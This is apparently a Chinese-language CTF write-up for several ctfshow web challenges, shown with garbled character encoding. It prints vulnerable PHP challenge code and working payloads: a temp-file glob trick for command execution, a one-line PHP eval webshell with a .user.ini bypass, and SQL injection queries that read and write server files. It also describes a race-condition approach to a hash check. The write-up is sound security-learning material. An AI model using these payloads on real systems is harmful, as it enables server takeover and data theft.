<p>å”‰ï¼Œçœ‹äº†åˆ«çš„å¸ˆå‚…wpï¼Œè¿˜æœ‰æ›´ç®€å•çš„å‡½æ•°highlight_fileï¼Œç›´æ¥ç§’äº†</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?cmd=highlight_file(&quot;903c00105c0141fd37ff47697e916e53616e33a72fb3774ab213b3e2a732f56f.php&quot;)</span><br></pre></td></tr></table></figure>

<h2 id="çº¢åŒ…é¢˜ç¬¬äºŒå¼¹"><a href="#çº¢åŒ…é¢˜ç¬¬äºŒå¼¹" class="headerlink" title="çº¢åŒ…é¢˜ç¬¬äºŒå¼¹"></a>çº¢åŒ…é¢˜ç¬¬äºŒå¼¹</h2><p>ç»™cmdéšä¾¿ç©¿äº†ä¸ªä¸œè¥¿å°±å¼¹å‡ºæºç </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">        if(isset($_GET[&#x27;cmd&#x27;]))&#123;</span><br><span class="line">            $cmd=$_GET[&#x27;cmd&#x27;];</span><br><span class="line">            highlight_file(__FILE__);</span><br><span class="line">            if(preg_match(&quot;/[A-Za-oq-z0-9$]+/&quot;,$cmd))&#123;</span><br><span class="line">            </span><br><span class="line">                die(&quot;cerror&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">            if(preg_match(&quot;/\~|\!|\@|\#|\%|\^|\&amp;|\*|\(|\)|\ï¼ˆ|\ï¼‰|\-|\_|\&#123;|\&#125;|\[|\]|\&#x27;|\&quot;|\:|\,/&quot;,$cmd))&#123;</span><br><span class="line">                die(&quot;serror&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">            eval($cmd);</span><br><span class="line">        </span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">     ?&gt;</span><br></pre></td></tr></table></figure>

<p>å¯è§ï¼Œèƒ½ç”¨çš„æœ‰ p &#x3D; + ; . ? &lt; &gt; &#96; \</p>
<p>æƒ³ä¸æ˜ç™½ç›´æ¥æ‰¾èµ„æ–™</p>
<blockquote>
<p>phpçš„ä¸Šä¼ æ¥å—multipart&#x2F;form-dataï¼Œç„¶åä¼šå°†å®ƒä¿å­˜åœ¨ä¸´æ—¶æ–‡ä»¶ä¸­ã€‚php.iniä¸­è®¾ç½®çš„<code>upload_tmp_dir</code>å°±æ˜¯è¿™ä¸ªä¸´æ—¶æ–‡ä»¶çš„ä¿å­˜ç›®å½•ã€‚linuxä¸‹é»˜è®¤ä¸º<code>/tmp</code>ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œåªè¦æ˜¯phpæ¥æ”¶åˆ°ä¸Šä¼ çš„POSTè¯·æ±‚ï¼Œå°±ä¼šä¿å­˜ä¸€ä¸ªä¸´æ—¶æ–‡ä»¶ï¼Œå¦‚ä½•è¿™ä¸ªphpè„šæœ¬å…·æœ‰â€œä¸Šä¼ åŠŸèƒ½â€é‚£ä¹ˆå®ƒå°†æ‹·è´èµ°ï¼Œæ— è®ºå¦‚ä½•å½“è„šæœ¬æ‰§è¡Œç»“æŸè¿™ä¸ªä¸´æ—¶æ–‡ä»¶éƒ½ä¼šè¢«åˆ é™¤ã€‚å¦å¤–ï¼Œè¿™ä¸ªphpä¸´æ—¶æ–‡ä»¶åœ¨linuxç³»ç»Ÿä¸‹çš„å‘½åè§„åˆ™æ°¸è¿œæ˜¯<code>phpXXXXXX</code></p>
</blockquote>
<p>åŸºæœ¬æ€è·¯å°±æ˜¯ä¸Šä¼ ï¼Œç„¶åç”¨eval+&#96;+?+.å»æ¨¡ç³ŠåŒ¹é…æ‰§è¡Œï¼ˆ.&#x3D;sourceï¼Œsourceä¸€ä¸ªæ–‡ä»¶ç›¸å½“äºæŠŠæ¯è¡Œçš„å‘½ä»¤ä¾æ¬¡æ‰§è¡Œä¸€æ¬¡ï¼‰</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202309222041842.png" alt="image-20230922204150800"></p>
<p>é‚£å°±æ˜¯è¦å…ˆå®Œæˆæ–‡ä»¶ä¸Šä¼ ï¼Œç›´æ¥è®©chatgptç»™å°±è¡Œ</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>æ–‡ä»¶ä¸Šä¼ ç¤ºä¾‹<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>æ–‡ä»¶ä¸Šä¼ ç¤ºä¾‹<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">id</span>=<span class="string">&quot;fileInput&quot;</span> <span class="attr">accept</span>=<span class="string">&quot;.jpg, .jpeg, .png, .gif&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;uploadFile()&quot;</span>&gt;</span>ä¸Šä¼ æ–‡ä»¶<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;response&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">uploadFile</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">const</span> fileInput = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;fileInput&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">const</span> responseDiv = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;response&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">if</span> (fileInput.<span class="property">files</span>.<span class="property">length</span> === <span class="number">0</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="title function_">alert</span>(<span class="string">&#x27;è¯·é€‰æ‹©ä¸€ä¸ªæ–‡ä»¶&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">return</span>;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">const</span> file = fileInput.<span class="property">files</span>[<span class="number">0</span>];</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">const</span> formData = <span class="keyword">new</span> <span class="title class_">FormData</span>();</span></span><br><span class="line"><span class="language-javascript">        formData.<span class="title function_">append</span>(<span class="string">&#x27;file&#x27;</span>, file);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="title function_">fetch</span>(<span class="string">&#x27;https://your-upload-url.com&#x27;</span>, &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">body</span>: formData</span></span><br><span class="line"><span class="language-javascript">        &#125;)</span></span><br><span class="line"><span class="language-javascript">        .<span class="title function_">then</span>(<span class="function"><span class="params">response</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">if</span> (response.<span class="property">ok</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">return</span> response.<span class="title function_">text</span>();</span></span><br><span class="line"><span class="language-javascript">            &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;æ–‡ä»¶ä¸Šä¼ å¤±è´¥&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">        &#125;)</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¿™æ—¶å€™ç›´æ¥å‘&#x2F;index.php?cmd&#x3D;?&gt;&lt;?&#x3D;`.+&#x2F;??p&#x2F;p?p??????`;ä¸Šä¼ test.txtï¼Œå†…å®¹æ˜¯</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#! /bin/bash</span><br><span class="line">cat /flag.txt</span><br></pre></td></tr></table></figure>

<p>å°±å¯ä»¥å¼¹å‡ºflag</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202309222118039.png" alt="image-20230922211835007"></p>
<h2 id="web13"><a href="#web13" class="headerlink" title="web13"></a>web13</h2><p>å”‰ï¼Œä¹Ÿæ˜¯è„‘æ®‹ã€‚æºç åœ¨upload.php.bak</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">	header(&quot;content-type:text/html;charset=utf-8&quot;);</span><br><span class="line">	$filename = $_FILES[&#x27;file&#x27;][&#x27;name&#x27;];</span><br><span class="line">	$temp_name = $_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;];</span><br><span class="line">	$size = $_FILES[&#x27;file&#x27;][&#x27;size&#x27;];</span><br><span class="line">	$error = $_FILES[&#x27;file&#x27;][&#x27;error&#x27;];</span><br><span class="line">	$arr = pathinfo($filename);</span><br><span class="line">	$ext_suffix = $arr[&#x27;extension&#x27;];</span><br><span class="line">	if ($size &gt; 24)&#123;</span><br><span class="line">		die(&quot;error file zise&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">	if (strlen($filename)&gt;9)&#123;</span><br><span class="line">		die(&quot;error file name&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">	if(strlen($ext_suffix)&gt;3)&#123;</span><br><span class="line">		die(&quot;error suffix&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">	if(preg_match(&quot;/php/i&quot;,$ext_suffix))&#123;</span><br><span class="line">		die(&quot;error suffix&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(preg_match(&quot;/php/i&quot;),$filename))&#123;</span><br><span class="line">        die(&quot;error file name&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">	if (move_uploaded_file($temp_name, &#x27;./&#x27;.$filename))&#123;</span><br><span class="line">		echo &quot;æ–‡ä»¶ä¸Šä¼ æˆåŠŸï¼&quot;;</span><br><span class="line">	&#125;else&#123;</span><br><span class="line">		echo &quot;æ–‡ä»¶ä¸Šä¼ å¤±è´¥ï¼&quot;;</span><br><span class="line">	&#125;</span><br><span class="line"> ?&gt;</span><br></pre></td></tr></table></figure>

<p>è¦æ±‚æ–‡ä»¶åä¸­æ²¡æœ‰phpè€Œä¸”åç¼€åå°äºç­‰äº3</p>
<p>é‚£åŸºæœ¬æ‰€æœ‰èƒ½ç›´æ¥ä½¿ç”¨çš„phpé¡µé¢éƒ½ä¼ ä¸ä¸Šå»äº†</p>
<p>è€Œä¸”è¦æ–‡ä»¶å¤§å°&lt;&#x3D;24ï¼Œé‚£å°±åªèƒ½è¿™ä¹ˆå†™äº†<code>&lt;?php eval($_POST[&#39;a&#39;]);</code></p>
<p>åˆä¸èƒ½ä¸Šä¼ .htaccessæ¥è§£æç»•è¿‡</p>
<blockquote>
<p>å¯¹äºphpä¸­çš„.user.iniæœ‰å¦‚ä¸‹è§£é‡Šï¼š</p>
<p>PHP ä¼šåœ¨æ¯ä¸ªç›®å½•ä¸‹æœå¯»çš„æ–‡ä»¶åï¼›å¦‚æœè®¾å®šä¸ºç©ºå­—ç¬¦ä¸²åˆ™ PHP ä¸ä¼šæœå¯»ã€‚ä¹Ÿå°±æ˜¯åœ¨.user.iniä¸­å¦‚æœè®¾ç½®äº†æ–‡ä»¶åï¼Œé‚£ä¹ˆä»»æ„ä¸€ä¸ªé¡µé¢éƒ½ä¼šå°†è¯¥æ–‡ä»¶ä¸­çš„å†…å®¹åŒ…å«è¿›å»ã€‚<br>æˆ‘ä»¬åœ¨.user.iniä¸­è¾“å…¥<code>auto_prepend_file =a.txt</code>ï¼Œè¿™æ ·åœ¨è¯¥ç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶éƒ½ä¼šåŒ…å«a.txtçš„å†…å®¹</p>
</blockquote>
<blockquote>
<p><a href="https://www.php.net/manual/zh/ini.core.php#ini.user-ini.cache-ttl">user_ini.cache_ttl</a> æ§åˆ¶ç€é‡æ–°è¯»å–ç”¨æˆ· INI æ–‡ä»¶çš„é—´éš”æ—¶é—´ã€‚é»˜è®¤æ˜¯ 300 ç§’ï¼ˆ5 åˆ†é’Ÿï¼‰ã€‚</p>
</blockquote>
<p>æ‰€ä»¥ä¸Šä¼ ä¹‹åè¦ç­‰ä¸€ä¼šæ‰èƒ½é‡æ–°å‘</p>
<h2 id="web14"><a href="#web14" class="headerlink" title="web14"></a>web14</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c = intval($_GET[&#x27;c&#x27;]);</span><br><span class="line">    sleep($c);</span><br><span class="line">    switch ($c) &#123;</span><br><span class="line">        case 1:</span><br><span class="line">            echo &#x27;$url&#x27;;</span><br><span class="line">            break;</span><br><span class="line">        case 2:</span><br><span class="line">            echo &#x27;@A@&#x27;;</span><br><span class="line">            break;</span><br><span class="line">        case 555555:</span><br><span class="line">            echo $url;</span><br><span class="line">        case 44444:</span><br><span class="line">            echo &quot;@A@&quot;;</span><br><span class="line">            break;</span><br><span class="line">        case 3333:</span><br><span class="line">            echo $url;</span><br><span class="line">            break;</span><br><span class="line">        case 222:</span><br><span class="line">            echo &#x27;@A@&#x27;;</span><br><span class="line">            break;</span><br><span class="line">        case 222:</span><br><span class="line">            echo &#x27;@A@&#x27;;</span><br><span class="line">            break;</span><br><span class="line">        case 3333:</span><br><span class="line">            echo $url;</span><br><span class="line">            break;</span><br><span class="line">        case 44444:</span><br><span class="line">            echo &#x27;@A@&#x27;;</span><br><span class="line">        case 555555:</span><br><span class="line">            echo $url;</span><br><span class="line">            break;</span><br><span class="line">        case 3:</span><br><span class="line">            echo &#x27;@A@&#x27;;</span><br><span class="line">        case 6000000:</span><br><span class="line">            echo &quot;$url&quot;;</span><br><span class="line">        case 1:</span><br><span class="line">            echo &#x27;@A@&#x27;;</span><br><span class="line">            break;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>éƒ½å¿˜äº†ï¼Œå¦‚æœswitch caseä¸åŠ breakä¼šä¸€ç›´é¡ºåºæ‰§è¡Œï¼Œæ‰€ä»¥ä¼ äº†</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=3</span><br></pre></td></tr></table></figure>

<p>ä¹‹åå°±ä¼šä¸€ç›´æ‰§è¡Œåˆ°echo â€œ$urlâ€;</p>
<p>è¿›å…¥ä¸‹ä¸€ä¸ªç½‘é¡µF12æœ‰æç¤º</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(preg_match(&#x27;/information_schema\.tables|information_schema\.columns|linestring| |polygon/is&#x27;, $_GET[&#x27;query&#x27;]))&#123;</span><br><span class="line">		die(&#x27;@A@&#x27;);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>è¯•äº†ä¸€ä¸‹å‘ç°æ˜¯intæ³¨å…¥ï¼Œç›´æ¥order byæŸ¥åªæœ‰ä¸€åˆ—ï¼Œå½“å‰æ•°æ®åº“ä¸ºwebã€‚è€Œä¸”banäº†information_schema.tablesã€‚</p>
<blockquote>
<p>å¯ä»¥ç”¨`information_schema`.`tables`ä»£æ›¿information_schema.tables</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?query=-1/**/union/**/select/**/group_concat(table_name)/**/from/**/`information_schema`.`tables`/**/where/**/`table_schema`=&#x27;web&#x27;%23</span><br><span class="line">=&gt;alert(&#x27;content&#x27;)</span><br><span class="line"></span><br><span class="line">?query=-1/**/union/**/select/**/group_concat(column_name)/**/from/**/`information_schema`.`columns`/**/where/**/`table_name`=&#x27;content&#x27;%23</span><br><span class="line">=&gt;alert(&#x27;id,username,password&#x27;)</span><br><span class="line"></span><br><span class="line">?query=-1/**/union/**/select/**/group_concat(id,&#x27;;&#x27;,username,&#x27;;&#x27;,password)/**/from/**/content%23</span><br><span class="line">=&gt;alert(&#x27;1;admin;flag is not here!,2;gtf1y;wow,you can really dance,3;Wow;tell you a secret,secret has a secret...&#x27;)</span><br></pre></td></tr></table></figure>

<p>å¥½å§ï¼Œå¹¶æ²¡æœ‰flagï¼Œé‚£å°±ç›´æ¥è¯•ä¸€ä¸‹load_fileè¯»å–æœ¬åœ°æ–‡ä»¶</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?query=-1/**/union/**/select/**/load_file(&quot;/var/www/html/secret.php&quot;)%23</span><br><span class="line">=&gt;alert(&#x27;&lt;!-- ReadMe --&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">$url = &#x27;here_1s_your_f1ag.php&#x27;;</span><br><span class="line">$file = &#x27;/tmp/gtf1y&#x27;;</span><br><span class="line">if(trim(@file_get_contents($file)) === &#x27;ctf.show&#x27;)&#123;</span><br><span class="line">	echo file_get_contents(&#x27;/real_flag_is_here&#x27;);</span><br><span class="line">&#125;&#x27;)</span><br></pre></td></tr></table></figure>

<p>çœ‹ä¸€ä¸‹ä»£ç å¯ä»¥å†è¯»ä¸€ä¸‹&#x2F;real_flag_is_here</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?query=-1/**/union/**/select/**/load_file(&quot;/real_flag_is_here&quot;)%23</span><br><span class="line">=&gt;alert(&#x27;ctfshow&#123;8eb644ba-4766-41b1-a638-34e2fe5f5312&#125;&#x27;)</span><br></pre></td></tr></table></figure>

<p>æˆ–è€…ä»ä»£ç é‡Œå¯ä»¥çœ‹å‡ºæ¥è¦åˆ¤æ–­$fileä¸­æ˜¯å¦å­˜åœ¨â€ctf.showâ€å­—ç¬¦ä¸²ï¼Œä¹Ÿå¯ä»¥é€šè¿‡into outfileå‡½æ•°å†™æ–‡ä»¶åˆ°&#x2F;tmp&#x2F;gtf1yä¸­</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?query=-1/**/union/**/select/**/&quot;ctf.show&quot;/**/into/**/outfile(&quot;/tmp/gtf1y&quot;)%23</span><br></pre></td></tr></table></figure>

<p>ç„¶åç›´æ¥è®¿é—®secret.phpï¼Œä¹Ÿèƒ½å¼¹å‡ºflag</p>
<h2 id="çº¢åŒ…é¢˜ç¬¬å…­å¼¹"><a href="#çº¢åŒ…é¢˜ç¬¬å…­å¼¹" class="headerlink" title="çº¢åŒ…é¢˜ç¬¬å…­å¼¹"></a>çº¢åŒ…é¢˜ç¬¬å…­å¼¹</h2><p>æ‰«ç›®å½•æœ‰web.zipæ³„éœ²ï¼Œå¯¹é¡µé¢å®¡è®¡å‘ç°æœ‰ä¸»è¦å‡½æ•°</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">function ctfshow(token,data)&#123;</span><br><span class="line"></span><br><span class="line">			var oReq = new XMLHttpRequest();</span><br><span class="line">			oReq.open(&quot;POST&quot;, &quot;check.php?token=&quot;+token+&quot;&amp;php://input&quot;, true);</span><br><span class="line">			oReq.onload = function (oEvent) &#123;</span><br><span class="line">				if(oReq.status===200)&#123;</span><br><span class="line">						var res=eval(&quot;(&quot;+oReq.response+&quot;)&quot;);</span><br><span class="line">						if(res.success ==1 &amp;&amp;res.error!=1)&#123;</span><br><span class="line">							alert(res.msg);</span><br><span class="line">							return;</span><br><span class="line">						&#125;</span><br><span class="line">						if(res.error ==1)&#123;</span><br><span class="line">							alert(res.errormsg);</span><br><span class="line">							return;</span><br><span class="line">						&#125;</span><br><span class="line">				&#125;</span><br><span class="line">				return;</span><br><span class="line">			&#125;;</span><br><span class="line">			oReq.send(data);</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure>

<p>ç»“åˆweb.zipä¸­çš„check.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">receiveStreamFile</span>(<span class="params"><span class="variable">$receiveFile</span></span>)</span>&#123;</span><br><span class="line"> </span><br><span class="line">    <span class="variable">$streamData</span> = <span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&#x27;HTTP_RAW_POST_DATA&#x27;</span>])? <span class="variable">$GLOBALS</span>[<span class="string">&#x27;HTTP_RAW_POST_DATA&#x27;</span>] : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$streamData</span>))&#123;</span><br><span class="line">        <span class="variable">$streamData</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$streamData</span>!=<span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line">        <span class="variable">$ret</span> = <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$receiveFile</span>, <span class="variable">$streamData</span>, <span class="literal">true</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$ret</span> = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$ret</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">date</span>(<span class="string">&quot;i&quot;</span>)) === <span class="variable">$token</span>)&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="variable">$receiveFile</span> = <span class="string">&#x27;flag.dat&#x27;</span>;</span><br><span class="line">	<span class="title function_ invoke__">receiveStreamFile</span>(<span class="variable">$receiveFile</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">md5_file</span>(<span class="variable">$receiveFile</span>)===<span class="title function_ invoke__">md5_file</span>(<span class="string">&quot;key.dat&quot;</span>))&#123;</span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">hash_file</span>(<span class="string">&quot;sha512&quot;</span>,<span class="variable">$receiveFile</span>)!=<span class="title function_ invoke__">hash_file</span>(<span class="string">&quot;sha512&quot;</span>,<span class="string">&quot;key.dat&quot;</span>))&#123;</span><br><span class="line">			<span class="variable">$ret</span>[<span class="string">&#x27;success&#x27;</span>]=<span class="string">&quot;1&quot;</span>;</span><br><span class="line">			<span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&quot;äººè„¸è¯†åˆ«æˆåŠŸ!<span class="subst">$flag</span>&quot;</span>;</span><br><span class="line">			<span class="variable">$ret</span>[<span class="string">&#x27;error&#x27;</span>]=<span class="string">&quot;0&quot;</span>;</span><br><span class="line">			<span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>);</span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">			<span class="variable">$ret</span>[<span class="string">&#x27;errormsg&#x27;</span>]=<span class="string">&quot;same file&quot;</span>;</span><br><span class="line">			<span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>);</span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">			<span class="variable">$ret</span>[<span class="string">&#x27;errormsg&#x27;</span>]=<span class="string">&quot;md5 error&quot;</span>;</span><br><span class="line">			<span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>);</span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;errormsg&#x27;</span>]=<span class="string">&quot;token error&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br></pre></td></tr></table></figure>

<p>éšä¾¿ä¼ ä¸ªä¸œè¥¿è¿‡å»å‘ç°ç›´æ¥æŠ¥md5 errorï¼Œå°±æ˜¯md5æ ¡éªŒé‚£é‡Œæ²¡è¿‡ï¼Œå†è·Ÿè¸ªä¸€ä¸‹receiveStreamFileå‡½æ•°çœ‹ä¸€ä¸‹ä»–åœ¨åšä»€ä¹ˆ</p>
<p>$streamDataä»php:&#x2F;&#x2F;inputé‡Œæ¥æ”¶æ•°æ®æµï¼Œç„¶åé€šè¿‡file_put_contentså†™å…¥åˆ°$receiveFileä¸­</p>
<p>é‡åˆ°äº†æŒºå¤šæ¬¡çš„å°ç‚¹ï¼Œè®°å½•ä¸€ä¸‹ä¸ºä»€ä¹ˆphp:&#x2F;&#x2F;inputä¼ ä¸è¿›å»æ–‡ä»¶çš„é—®é¢˜</p>
<blockquote>
<p>php:&#x2F;&#x2F;inputå¯ä»¥è®¿é—®è¯·æ±‚çš„åŸå§‹æ•°æ®çš„åªè¯»æµï¼Œåœ¨POSTè¯·æ±‚ä¸­è®¿é—®POSTçš„<code>data</code>éƒ¨åˆ†ï¼Œåœ¨<code>enctype=&quot;multipart/form-data&quot;</code> çš„æ—¶å€™<code>php://input </code>æ˜¯æ— æ•ˆçš„ã€‚</p>
</blockquote>
<p>è€Œ$receiveFileå·²ç»å†™æ­»æ˜¯flag.datï¼Œé‚£å”¯ä¸€å¯æ§çš„å°±æ˜¯ä¼ è¾“è¿‡å»çš„æ•°æ®æµ</p>
<p>å¯ä»¥ç›´æ¥æŠŠkey.datä¸‹ä¸‹æ¥ï¼Œå°±å¯ä»¥å¾—åˆ°ç›®æ ‡æ–‡ä»¶çš„dataï¼Œç°åœ¨å°±éœ€è¦æƒ³æ€ä¹ˆæŠŠæœ¬åœ°çš„key.datä¼ åˆ°æœåŠ¡å™¨é‡Œ</p>
<p>é‚£å°±å¯ä»¥æœ¬åœ°ç»™ä¸ªä¸Šä¼ å‰ç«¯ï¼ˆçº¢åŒ…é¢˜ç¬¬äºŒå¼¹ï¼‰ï¼Œç„¶ååœ¨bpé‡Œç¨å¾®æ”¹ä¸€ä¸‹dataå°±èƒ½ç»•è¿‡md5</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202309231940594.png" alt="image-20230923194044472"></p>
<p>è¿˜è¦æŠŠæ–‡ä»¶å°¾çš„å›è½¦åˆ æ‰ï¼Œè¿™æ—¶å°±èƒ½å¼¹å‡ºsame fileçš„æŠ¥é”™ã€‚è¿™è¯´æ˜md5ç›¸ç­‰è€Œä¸”sha512ä¹Ÿç›¸ç­‰</p>
<p>è¿™ä¸ªæ—¶å€™çœ‹äº†ç½‘ä¸Šå¤§éƒ¨åˆ†wpï¼Œéƒ½è¯´æ˜¯md5ç¢°æ’ï¼Œä½†å…¶å®ä¸æ˜¯çš„ã€‚è¿™æ˜¯<strong>æ¡ä»¶ç«äº‰</strong></p>
<p>ä¸¤ä¸ªifåˆ¤æ–­ä¸­å¿…ç„¶ä¼šæœ‰æ—¶é—´å·®ï¼Œè¦åˆ©ç”¨è¿™ä¸ªæ—¶é—´å·®æŠŠflag.datå†æ¬¡æ›¿æ¢ä¸€éï¼Œæ‰å¯ä»¥åšåˆ°ç»•è¿‡sha512</p>
<p>å¦‚æœå•çº¯åˆ©ç”¨fastcollï¼Œæ˜¯ç¢°æ’ä¸å‡ºæ¥å’Œkey.datæœ‰ç›¸åŒmd5çš„æ–‡ä»¶ï¼Œè¿™ä¹Ÿæ˜¯æˆ‘çœ‹äº†å¾ˆä¹…æƒ³ä¸æ˜ç™½çš„ç‚¹</p>
<p>è€Œæ¡ä»¶ç«äº‰é€šå¸¸éœ€è¦pythonçš„å¤šçº¿ç¨‹æ“ä½œã€‚è¿™é‡Œæœ‰ç‰¹æ®Šå­—ç¬¦ï¼Œbpç»å¸¸ä¼šè‡ªåŠ¨ç»™ä½ åŠ payloadå¯¼è‡´å’Œæºæ–‡ä»¶ä¸ä¸€è‡´ï¼Œæ‰€ä»¥ä½¿ç”¨pythonçš„threadæ¨¡å—</p>
